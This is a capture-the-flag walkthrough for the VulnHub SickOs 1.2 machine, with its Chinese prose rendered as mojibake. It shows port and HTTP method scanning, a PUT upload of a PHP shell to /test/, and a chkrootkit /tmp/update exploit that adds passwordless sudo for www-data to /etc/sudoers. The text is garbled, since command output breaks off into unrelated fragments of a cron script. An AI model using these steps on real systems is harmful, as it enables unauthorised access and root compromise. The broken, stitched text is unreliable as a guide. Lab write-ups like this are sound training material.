# SickOs 1.2
ä¸‹è½½åœ°å€ï¼šhttps://download.vulnhub.com/sickos/sick0s1.2.zip
## å®žæˆ˜æ“ä½œ
æ‰«æé¶åœºIPåœ°å€ï¼š`192.168.32.148`
![image-20220531102836395](../../.gitbook/assets/image-20220531102836395.png)
æ‰«æç«¯å£ï¼Œå‘çŽ°åªå¼€å¯**22**å’Œ**80**ç«¯å£
```
â”Œâ”€â”€(rootðŸ’€kali)-[/tmp]
â””â”€# nmap  -sT  -p1-65535 192.168.32.148                                                                              
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 22:30 EDT
Nmap scan report for 192.168.32.148
Host is up (0.00067s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:3D:60:3D (VMware)
Nmap done: 1 IP address (1 host up) scanned in 104.58 seconds
```
æµè§ˆå™¨è®¿é—®80ç«¯å£
![image-20220531103338753](../../.gitbook/assets/image-20220531103338753.png)
ä½¿ç”¨ç›®å½•æ‰«æå™¨åªæ‰«æåˆ°**test**ç›®å½•
![image-20220531103856954](../../.gitbook/assets/image-20220531103856954.png)
é€šè¿‡ curl æ£€æŸ¥å¯ç”¨æ–¹æ³•æ—¶ï¼ŒPUT æ–¹æ³•å¯ç”¨ã€‚è¿™å¯ç”¨äºŽä¸Šä¼ åå‘ shellã€‚
```
â”Œâ”€â”€(rootðŸ’€kali)-[/tmp]
â””â”€# curl -v -X OPTIONS  http://192.168.32.148/test/
*   Trying 192.168.32.148:80...
* Connected to 192.168.32.148 (192.168.32.148) port 80 (#0)
> OPTIONS /test/ HTTP/1.1
> Host: 192.168.32.148
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
' http://192.168.32.148/test/shell.php
*   Trying 192.168.32.148:80...
* Connected to 192.168.32.148 (192.168.32.148) port 80 (#0)
> PUT /test/shell.php HTTP/1.1
> Host: 192.168.32.148
> User-Agent: curl/7.81.0
> Accept: */*
> Content-Length: 36
> Content-Type: application/x-www-form-urlencoded
> 
* Mark bundle as not supporting multiuse
 $LOG_DIR/log.today.raw 2>&1
                                # the sed expression replaces the messages about /sbin/dhclient3 /usr/sbin/dhcpd3
                                # with a message that is the same whatever order eth0 and eth1 were scanned
                                sed -r -e 's,eth(0|1)(:[0-9])?: PACKET SNIFFER\((/sbin/dhclient3|/usr/sbin/dhcpd3)\[[0-9]+\]\),eth\[0|1\]: PACKET SNIFFER\([dhclient3|dhcpd3]{PID}\),' \
                                -e 's/(! \w+\s+)[ 0-9]{4}[0-9]/\1#####/' $LOG_DIR/log.today.raw > $LOG_DIR/log.today
        if [ ! -f $LOG_DIR/log.expected ]; then
                                                echo "ERROR: No file $LOG_DIR/log.expected"
                                                echo "This file should contain expected output from chkrootkit"
                                                echo
                                                echo "Today's run produced the following output:"
                                                echo "--- [ BEGIN: cat $LOG_DIR/log.today  ] ---"
                                                cat $LOG_DIR/log.today
                                                echo "--- [ END: cat $LOG_DIR/log.today ] ---"
                                                echo
                                                echo "To create this file containing all output from today's run, do (as root)"
                                                echo "# cp -a $LOG_DIR/log.today $LOG_DIR/log.expected"
                                                echo "# (note that unedited output is in $LOG_DIR/log.today.raw)"
                                elif ! diff -q $LOG_DIR/log.expected $LOG_DIR/log.today > /dev/null 2>&1; then
                                                echo "ERROR: chkrootkit output was not as expected."
                                                echo
                                                echo "The difference is:"
                                                echo "---[ BEGIN: diff -u $LOG_DIR/log.expected $LOG_DIR/log.today ] ---"
                                                diff -u $LOG_DIR/log.expected $LOG_DIR/log.today || true
                                                echo "---[ END: diff -u $LOG_DIR/log.expected $LOG_DIR/log.today ] ---"
                                                echo
                                                echo "To update the expected output, run (as root)"
                                                echo "#  cp -a -f $LOG_DIR/log.today $LOG_DIR/log.expected"
                                                echo "# (note that unedited output is in $LOG_DIR/log.today.raw)"
        fi
    else
        eval $CHKROOTKIT $RUN_DAILY_OPTS
    fi
fi
```
æŸ¥çœ‹expä¿¡æ¯
```
â”Œâ”€â”€(rootðŸ’€kali)-[/opt]
â””â”€# searchsploit -x linux/local/33899.txt
```
![image-20220531111228156](../../.gitbook/assets/image-20220531111228156.png)
å› æ­¤ï¼Œå¦‚æžœæˆ‘ä»¬åˆ›å»ºä¸€ä¸ª bash è„šæœ¬å¹¶å°†å…¶æ”¾åœ¨ç›®å½•ä¸­è°ƒç”¨çš„æ–‡ä»¶`update`ä¸­`/tmp`å¹¶è®¾ç½®å…¶å¯æ‰§è¡Œæƒé™ï¼Œå®ƒå°†ä»¥ root èº«ä»½è¿è¡Œã€‚
```
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
chmod 777 /tmp/update
sudo su
```
![image-20230208160448038](../../.gitbook/assets/image-20230208160448038.png)